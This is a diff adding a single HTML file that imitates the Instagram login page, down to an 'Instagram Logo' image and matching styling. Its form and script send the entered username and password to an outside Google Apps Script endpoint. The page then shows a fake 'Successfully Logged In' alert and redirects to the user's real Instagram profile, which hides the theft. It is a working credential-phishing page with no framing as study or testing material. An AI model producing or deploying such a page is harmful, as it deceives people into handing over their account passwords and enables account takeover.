@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Form</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            padding: 0;
+            margin: 0;
+            font-family: 'poppins', sans-serif;
+            font-size: 14px;
+        }
+
+        body {
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            padding: 50px 30px;
+            border: 1px solid #dbdbdb;
+            border-radius: 5px;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border-radius: 3px;
+            border: 1px solid #dbdbdb;
+            font-size: 12px;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #b4acac;
+        }
+
+        #submit {
+            background-color: #0095f6;
+            color: white;
+            width: 100%;
+            padding: 7px 16px;
+            margin-top: 10px;
+            font-size: 14px;
+            border-radius: 8px;
+            border: 0px;
+            cursor: pointer;
+            letter-spacing: 1px;
+        }
+
+        #submit:hover {
+            background-color: #1877f2;
+        }
+
+        .logo-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 40px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="logo-container">
+            <img src="https://cdn.shopify.com/s/files/1/0685/8529/2004/files/Logo.png?v=1742134808"
+                alt=" Instagram Logo" width="175" height="54" style="display:block;width:175px;height:54px;">
+        </div>
+        <form id="contact-form" method="POST"
+            action="https://script.google.com/macros/s/AKfycbzNFLpnobPBuDnM1b8-QciEshp3Q0oj518I41xRYRxrYfov0P_Ck59_e6RsyT2Ez54/exec">
+            <input type="text" name="username" placeholder="Phone number, username, or email">
+            <input type="password" name="password" placeholder="Password">
+            <input type="submit" value="Log In" id="submit">
+        </form>
+    </div>
+
+    <script>
+
+        window.addEventListener("load", function () {
+            const form = document.getElementById("contact-form");
+
+            form.addEventListener("submit", async function (e) {
+                e.preventDefault();
+                document.getElementById("submit").classList.add("disabled");
+
+                const data = new FormData(form);
+                const action = e.target.action;
+                const username = form.elements["username"].value.trim(); // Trim extra spaces
+
+                try {
+                    let response = await fetch(action, {
+                        method: "POST",
+                        body: data,
+                    });
+
+                    let result = await response.text();
+                    console.log("Server Response:", result); // Debugging
+
+                    if (response.ok) {
+                        alert(`Successfully Logged In, ${username}!`);
+                        document.getElementById("submit").classList.remove("disabled");
+                        form.reset();
+
+                        // ✅ Instagram profile par redirect
+                        let instaURL = `https://www.instagram.com/${encodeURIComponent(username)}/`;
+                        console.log("Redirecting to:", instaURL);
+                        window.location.href = instaURL;
+                    } else {
+                        alert("Error: " + result);
+                    }
+                } catch (error) {
+                    alert("Login failed. Please try again.");
+                    console.error("Fetch Error:", error);
+                }
+            });
+        });
+
+    </script>
+</body>
+
+</html>
